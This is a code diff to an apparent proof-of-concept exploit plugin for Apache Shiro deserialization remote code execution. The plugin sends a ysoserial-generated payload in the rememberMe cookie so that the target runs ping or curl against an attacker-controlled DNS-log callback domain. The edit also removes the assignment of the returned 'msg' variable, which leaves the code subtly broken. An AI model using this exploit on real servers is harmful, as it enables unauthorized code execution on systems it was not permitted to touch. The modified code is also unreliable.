@@ -11,15 +11,15 @@ python POC-T.py -s shiro-deserial-rce -iS 127.0.0.1:8080
 """
 
 import os
-import re
+import random
 import base64
 import uuid
 import subprocess
 import requests
 from Crypto.Cipher import AES
-from plugin.cloudeye import CloudEye
+from plugin.dnslog import DNSLog
 
-JAR_FILE = '/home/xy/exps/ysoserial/target/ysoserial-0.0.5-SNAPSHOT-all.jar'
+JAR_FILE = '/Users/dongguangli/Downloads/ysoserial-0.0.5/target/ysoserial-0.0.5-all.jar'
 
 
 def poc(url):
@@ -28,17 +28,16 @@ def poc(url):
     else:
         target = url
     try:
-        cloudeye = CloudEye()
+        cloudeye = DNSLog()
         domain = cloudeye.getRandomDomain('shiro')  # 设置dns特征域名组
-        rce_command = 'ping -n 3 %s || ping -c 3 %s' % (domain, domain)  # 目标机执行的代码
+        rce_command_list = ['ping -n 3 %s || ping -c 3 %s' % (domain, domain),'ping -c 3 %s' % (domain),'curl %s' % (domain)]  # 目标机执行的代码
+        randomint = random.randrange(0,len(rce_command_list))
+        rce_command = rce_command_list[randomint]   # 随机选一个payload跑
         payload = generator(rce_command, JAR_FILE)  # 生成payload
         requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
 
-        dnslog = cloudeye.getDnsRecord(delay=2)
-        if domain in dnslog:
-            msg = url
-            for each in re.findall(r'client (.*)#', dnslog):  # 获取出口ip
-                msg += ' - ' + each
+        dnslog = cloudeye.verifyDNS(delay=2)
+        if dnslog:
             return msg
 
     except Exception, e:
